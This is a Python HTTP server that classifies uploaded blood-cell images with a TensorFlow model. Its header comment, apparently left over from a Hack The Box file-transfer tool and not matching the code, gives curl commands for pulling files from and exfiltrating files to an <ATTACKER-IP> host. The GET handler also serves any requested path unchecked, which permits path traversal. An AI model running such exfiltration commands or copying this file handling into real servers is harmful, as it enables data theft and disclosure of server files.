#!/usr/env python3
########################################################################
#
#  Simple HTTP server that  supports file upload  for moving data around
#  between boxen on HTB. Based on a gist by bones7456, but mangled by me
#  as I've tried  (badly) to port it to Python 3, code golf it, and make
#  It a  little more  robust. I was also able to  strip out a lot of the
#  code trivially  because Python3 SimpleHTTPServer is  a thing, and the
#  cgi module handles multipart data nicely.
#
#  Lifted from: https://gist.github.com/UniIsland/3346170
#
#  Important to note that this tool is quick and dirty and is a good way
#  to get yourself  popped if you're leaving it  running out in the real
#  world.
#
#  Run it on your attack box from the folder that contains your tools.
#
#  From the target machine:
#  Infil file: curl -O http://<ATTACKER-IP>:44444/<FILENAME>
#  Exfil file: curl -F 'file=@<FILENAME>' http://<ATTACKER-IP>:44444/
#
#  Multiple file upload supported, just add more -F 'file=@<FILENAME>'
#  parameters to the command line.
#
########################################################################
import http.server
import socketserver
import io
import cgi

import tensorflow as tf
import cv2
import numpy as np
import json
import os
from datetime import datetime
import random
import string

# Change this to serve on a different port
PORT = 44444

model = tf.keras.models.load_model('../q1modelg.hdf5')
class_names = ['EOSINOPHIL', 'LYMPHOCYTE', 'MONOCYTE', 'NEUTROPHIL']


class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):  # static content
        root = os.path.join(os.path.dirname(
            os.path.abspath(__file__)), 'static')
        # print(root)
        if self.path == '/':
            filename = root + '/index.html'
        elif self.path == '/legal':
            filename = root + '/legal.html'
        else:
            filename = root + self.path

        self.send_response(200)
        if filename[-4:] == '.css':
            self.send_header('Content-type', 'text/css')
        elif filename[-5:] == '.json':
            self.send_header('Content-type', 'application/javascript')
        elif filename[-3:] == '.js':
            self.send_header('Content-type', 'application/javascript')
        elif filename[-4:] == '.ico':
            self.send_header('Content-type', 'image/x-icon')
        else:
            self.send_header('Content-type', 'text/html')
        self.end_headers()
        with open(filename, 'rb') as fh:
            html = fh.read()
            #html = bytes(html, 'utf8')
            self.wfile.write(html)

    def do_POST(self):
        r, pred = self.deal_post_data()
        print(r, pred, "by: ", self.client_address)
        f = io.BytesIO()
        if r:
            self.send_response(200)
            outobj = {"prediction": pred}
            f.write(bytes(json.dumps(outobj), 'ascii'))
        else:
            self.send_response(500)
            f.write(b"Failed\n")
        length = f.tell()
        f.seek(0)

        self.send_header("Content-type", "text/plain")
        self.send_header("Content-Length", str(length))
        self.end_headers()
        if f:
            self.copyfile(f, self.wfile)
            f.close()

    def deal_post_data(self):
        pred = -1
        ctype, pdict = cgi.parse_header(self.headers['Content-Type'])
        pdict['boundary'] = bytes(pdict['boundary'], "utf-8")
        pdict['CONTENT-LENGTH'] = int(self.headers['Content-Length'])
        if ctype == 'multipart/form-data':
            form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={
                                    'REQUEST_METHOD': 'POST', 'CONTENT_TYPE': self.headers['Content-Type'], })
            # print(type(form))
            fileobj = form["file"]
            #readfile = fileobj.file.read()
            try:
                npimg = np.fromfile(fileobj.file, np.uint8)
                image = cv2.imdecode(npimg, cv2.IMREAD_COLOR)
                # converting BGR image to RGB
                image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)
                image_size = (120, 120)
                # resizing the input image acc to model input size
                image = cv2.resize(image, image_size)
                image = image.astype('float32')
                image /= 255
                image = np.expand_dims(image, axis=0)
                pred = np.argmax(model.predict(image))
            except:
                return False, ''
            try:  # Image saving part
                if form.getvalue('shareImageCheckbox') == 'on':
                    root = os.path.join(os.path.dirname(
                        os.path.abspath(__file__)), 'uploaded')
                    if not os.path.isdir(root):
                        os.makedirs(root)
                    fn = str(int(datetime.timestamp(datetime.now()))) + '-' + ''.join(random.choices(string.ascii_letters +
                                                                                                     string.digits, k=8)) + os.path.splitext(fileobj.filename)[1]  # integer timestamp + 8 random chars + extension
                    fileobj.file.seek(0)
                    open(os.path.join(root, fn), 'wb').write(
                        fileobj.file.read())
                    #cv2.imwrite(os.path.join(root, fn), image)
            except Exception as e:
                print(e)
                return False, ''
        else:
            return False, ''
        return (True, class_names[pred])


Handler = CustomHTTPRequestHandler
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print("serving at port", PORT)
    httpd.serve_forever()
